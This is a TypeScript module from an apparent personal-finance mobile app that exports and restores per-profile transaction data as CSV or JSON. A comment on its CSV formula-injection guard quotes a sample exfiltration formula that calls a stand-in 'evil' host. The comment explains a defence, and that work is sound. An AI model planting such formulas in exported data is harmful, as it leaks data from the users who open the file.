// Data export + import — CSV (transactions only) or full JSON dump.
//
// Scope is per-PROFILE: each profile has its own SQLite DB file
// (see utils/profiles.ts), and `getRawDB()` returns whichever is
// active. To back up a different profile, switch to it in Me → Profiles
// first, then re-run export. Same applies to import.
//
// The JSON payload covers every user-authored table plus the FX rate
// cache: without rates, the first net-worth snapshot after a restore
// counts foreign balances 1:1 (a $40k account became 40k KZT). The
// 24h TTL still refreshes the restored rates on the next launch.

import { Alert } from 'react-native';
import * as FileSystem from 'expo-file-system/legacy';
import * as Sharing from 'expo-sharing';
import * as DocumentPicker from 'expo-document-picker';
import { getRawDB } from '@/utils/db/client';
import { bumpVersion, repairLiabilitySigns, linkStandaloneDebts } from '@/hooks/useAppData';
import { refreshTodaySnapshot } from '@/utils/netWorthSnapshot';
import { kv, type KVSchema } from '@/utils/kv';
import { getActiveProfile } from '@/utils/profiles';
import { APP_NAME } from '@/constants/flavor';
import { t } from '@/utils/i18n';

export type ExportFormat = 'json' | 'csv';

/** JSON-export schema version. Bump when the on-disk shape changes.
 *  Import checks this for forward-compat — older payloads are upcast,
 *  newer ones are rejected with a clear error. */
const EXPORT_SCHEMA_VERSION = 3;

/** Profile-scoped preferences that travel with the data. Without these a
 *  restore onto a fresh install lands KZT data under the USD default.
 *  Device / app-level keys (locale, theme, biometrics) are NOT included. */
const BACKUP_SETTINGS: (keyof KVSchema)[] = [
  'currency',
  'currencyFormat',
  'defaultAccountId',
  'smartSuggestions',
  'fabSwapAction',
  'planSegment',
  'accountsOverviewHidden',
];

/** Tables included in the JSON dump, in dependency-safe insert order
 *  (accounts before transactions, recurring before paid_items). */
const BACKUP_TABLES = [
  'fx_rates',
  'accounts',
  'custom_categories',
  'transactions',
  'budgets',
  'recurring',
  'paid_items',
  'merchant_memory',
  'debts',
  'goals',
  'net_worth_snapshots',
] as const;

export async function exportData(format: ExportFormat = 'json'): Promise<void> {
  const raw = getRawDB();
  let payload: string;
  let ext: string;
  let mime: string;

  if (format === 'csv') {
    // Spreadsheet-friendly: account names + currencies joined in, the
    // entry-currency original and the To-side credit for transfers, and
    // an ISO date next to the raw timestamp.
    const rows = raw.getAllSync<Record<string, unknown>>(
      `SELECT t.id, t.type, t.amount,
              a.currency AS account_currency, a.name AS account_name,
              t.category, t.account_id, t.to_account_id, b.name AS to_account_name,
              t.to_amount, b.currency AS to_account_currency,
              t.original_amount, t.original_currency,
              t.note, t.date, t.recurring_id, t.halal_status, t.applied
         FROM transactions t
         LEFT JOIN accounts a ON a.id = t.account_id
         LEFT JOIN accounts b ON b.id = t.to_account_id
        ORDER BY t.date DESC`,
    );
    const defaultCcy = kv.get('currency') ?? 'USD';
    for (const r of rows) {
      r.account_currency = r.account_currency ?? defaultCcy;
      if (r.to_account_id) r.to_account_currency = r.to_account_currency ?? defaultCcy;
      r.date_iso = typeof r.date === 'number' ? new Date(r.date).toISOString() : '';
    }
    const cols = [
      'id',
      'type',
      'amount',
      'account_currency',
      'account_name',
      'category',
      'account_id',
      'to_account_id',
      'to_account_name',
      'to_amount',
      'to_account_currency',
      'original_amount',
      'original_currency',
      'note',
      'date_iso',
      'date',
      'recurring_id',
      'halal_status',
      'applied',
    ];
    const header = cols.join(',');
    const lines = rows.map((r) => cols.map((c) => csvEscape(r[c])).join(','));
    payload = [header, ...lines].join('\n');
    ext = 'csv';
    mime = 'text/csv';
  } else {
    const dump: Record<string, unknown> = {
      schemaVersion: EXPORT_SCHEMA_VERSION,
      exportedAt: new Date().toISOString(),
    };
    for (const table of BACKUP_TABLES) {
      dump[table] = raw.getAllSync(`SELECT * FROM ${table}`);
    }
    const settings: Record<string, string> = {};
    for (const k of BACKUP_SETTINGS) {
      const v = kv.get(k);
      if (v !== undefined) settings[k] = v;
    }
    dump.settings = settings;
    dump.profile = { name: getActiveProfile().name };
    payload = JSON.stringify(dump, null, 2);
    ext = 'json';
    mime = 'application/json';
  }

  // Keep letters in any script; only strip characters that are unsafe
  // in file names (avoids Unicode-property regexes for Hermes' sake).
  const profileSlug = getActiveProfile().name.replace(/[\s\/\\:*?"<>|.,;]+/g, '-').replace(/^-+|-+$/g, '').toLowerCase() || 'profile';
  const stamp = new Date().toISOString().slice(0, 10);
  const file = `${FileSystem.cacheDirectory}${APP_NAME.toLowerCase()}-${format === 'json' ? 'backup' : 'transactions'}-${profileSlug}-${stamp}.${ext}`;
  await FileSystem.writeAsStringAsync(file, payload);
  if (await Sharing.isAvailableAsync()) {
    await Sharing.shareAsync(file, { mimeType: mime });
  } else {
    Alert.alert('Saved', `File written to ${file}`);
  }
}

/** Restore a previously exported JSON dump into the active profile's
 *  database. Destructive: every row in the backup tables is wiped first.
 *
 *  Two-stage UX:
 *    1. picker → reads + parses + validates the file (no DB writes yet)
 *    2. native confirm Alert → only then do we touch the DB
 *
 *  Returns `'ok'` on success, `'cancelled'` if the user backs out,
 *  or throws on a malformed file. */
export async function importData(): Promise<'ok' | 'cancelled'> {
  const pick = await DocumentPicker.getDocumentAsync({
    type: ['application/json', 'text/plain', '*/*'],
    multiple: false,
    copyToCacheDirectory: true,
  });
  if (pick.canceled || !pick.assets?.[0]) return 'cancelled';

  const uri = pick.assets[0].uri;
  const raw = await FileSystem.readAsStringAsync(uri);
  const parsed = parseAndValidate(raw);

  // Confirm before any destructive write. Native dialog wraps a Promise
  // so we can branch on the user's choice.
  const confirmed = await new Promise<boolean>((resolve) => {
    Alert.alert(
      t('me.import.confirm.title'),
      t('me.import.confirm.body', { rows: countRows(parsed) }),
      [
        { text: t('common.cancel'), style: 'cancel', onPress: () => resolve(false) },
        { text: t('me.import.confirm.replace'), style: 'destructive', onPress: () => resolve(true) },
      ],
      { cancelable: true, onDismiss: () => resolve(false) },
    );
  });
  if (!confirmed) return 'cancelled';

  applyImport(parsed);
  // Preferences that came with the backup (v3+). Older dumps keep
  // whatever the profile already had.
  for (const k of BACKUP_SETTINGS) {
    const v = parsed.settings[k];
    if (typeof v === 'string') kv.set(k, v);
  }
  // Restored rows may predate today's data repairs (positive loan
  // balances, standalone debt rows) — the per-profile flags are already
  // set on this profile, so run them unconditionally.
  try { repairLiabilitySigns({ force: true }); } catch { /* best-effort */ }
  try { linkStandaloneDebts({ force: true }); } catch { /* best-effort */ }
  try { refreshTodaySnapshot(); } catch { /* best-effort */ }
  bumpVersion();
  return 'ok';
}

interface ParsedDump {
  schemaVersion: number;
  tables: Partial<Record<typeof BACKUP_TABLES[number], Record<string, unknown>[]>>;
  settings: Partial<Record<keyof KVSchema, string>>;
}

function parseAndValidate(raw: string): ParsedDump {
  let json: unknown;
  try {
    json = JSON.parse(raw);
  } catch {
    throw new Error(t('me.import.error.invalidJson'));
  }
  if (typeof json !== 'object' || json === null) {
    throw new Error(t('me.import.error.notAnExport'));
  }
  const obj = json as Record<string, unknown>;
  const schemaVersion =
    typeof obj.schemaVersion === 'number' ? obj.schemaVersion : 1;
  if (schemaVersion > EXPORT_SCHEMA_VERSION) {
    throw new Error(t('me.import.error.tooNew', { v: schemaVersion }));
  }
  // Must contain at least one of the recognised tables — guards against
  // restoring a random JSON file the user picked by mistake.
  const tables: ParsedDump['tables'] = {};
  let found = 0;
  for (const t of BACKUP_TABLES) {
    const v = obj[t];
    if (Array.isArray(v)) {
      tables[t] = v as Record<string, unknown>[];
      found++;
    }
  }
  // Legacy v1 export: `paidItems` and `merchantMemory` were camelCase.
  if (!tables.paid_items && Array.isArray(obj.paidItems)) {
    tables.paid_items = obj.paidItems as Record<string, unknown>[];
    found++;
  }
  if (!tables.merchant_memory && Array.isArray(obj.merchantMemory)) {
    tables.merchant_memory = obj.merchantMemory as Record<string, unknown>[];
    found++;
  }
  if (found === 0) {
    throw new Error(t('me.import.error.noTables'));
  }
  const settings: ParsedDump['settings'] = {};
  if (typeof obj.settings === 'object' && obj.settings !== null) {
    for (const k of BACKUP_SETTINGS) {
      const v = (obj.settings as Record<string, unknown>)[k];
      if (typeof v === 'string') settings[k] = v;
    }
  }
  return { schemaVersion, tables, settings };
}

function countRows(p: ParsedDump): number {
  return Object.values(p.tables).reduce((s, arr) => s + (arr?.length ?? 0), 0);
}

function applyImport(p: ParsedDump): void {
  const raw = getRawDB();
  // Single transaction so a mid-way failure doesn't leave a half-restored
  // database. SQLite's BEGIN IMMEDIATE keeps other readers locked out for
  // the brief duration.
  raw.execSync('BEGIN IMMEDIATE');
  try {
    // Wipe in REVERSE dependency order so FK-style references don't
    // tear at intermediate steps (we don't declare FK constraints, but
    // the order keeps a partial-restore from showing orphan rows on
    // cancel).
    const order = [...BACKUP_TABLES].reverse();
    for (const t of order) {
      raw.execSync(`DELETE FROM ${t}`);
    }
    // Now bulk insert. Skip tables not present in the dump so an older
    // export missing e.g. `goals` doesn't blow up.
    for (const t of BACKUP_TABLES) {
      const rows = p.tables[t];
      if (!rows || rows.length === 0) continue;
      insertRows(t, rows);
    }
    raw.execSync('COMMIT');
  } catch (e) {
    raw.execSync('ROLLBACK');
    throw e;
  }
}

function insertRows(table: string, rows: Record<string, unknown>[]): void {
  const raw = getRawDB();
  // Columns = union of the dump's keys ∩ the live table's columns, so a
  // backup from a slightly different build still restores (unknown
  // columns are dropped, missing ones take the table default).
  const live = new Set(
    raw.getAllSync<{ name: string }>(`PRAGMA table_info(${table})`).map((c) => c.name),
  );
  const seen = new Set<string>();
  for (const r of rows) for (const k of Object.keys(r)) if (live.has(k)) seen.add(k);
  const cols = Array.from(seen);
  if (cols.length === 0) return;
  const placeholders = cols.map(() => '?').join(', ');
  const sql = `INSERT INTO ${table} (${cols.map((c) => `"${c}"`).join(', ')}) VALUES (${placeholders})`;
  const stmt = raw.prepareSync(sql);
  try {
    for (const row of rows) {
      const values = cols.map((c) => normaliseValue(row[c]));
      stmt.executeSync(values as never);
    }
  } finally {
    stmt.finalizeSync();
  }
}

/** SQLite via expo-sqlite stores: number, string, null, or Uint8Array.
 *  JSON deserialises booleans + nested objects we don't want hitting
 *  the driver. Coerce them to safe primitives. */
function normaliseValue(v: unknown): string | number | null {
  if (v == null) return null;
  if (typeof v === 'string') return v;
  if (typeof v === 'number') return v;
  if (typeof v === 'boolean') return v ? 1 : 0;
  // Fallback: stringify anything weird so the insert still works.
  return JSON.stringify(v);
}

// CSV escape with formula-injection guard. Cells starting with =, +, -, @,
// tab, or CR are interpreted as formulas by Excel / Sheets / Numbers — a
// crafted note like `=HYPERLINK("http://evil","click")` would exfiltrate
// when the user opens the export. Prefix those cells with `'` so they're
// rendered as literal text. CWE-1236.
function csvEscape(v: unknown): string {
  if (v == null) return '';
  let s = String(v).replace(/"/g, '""');
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return /[",\n]/.test(s) ? `"${s}"` : s;
}
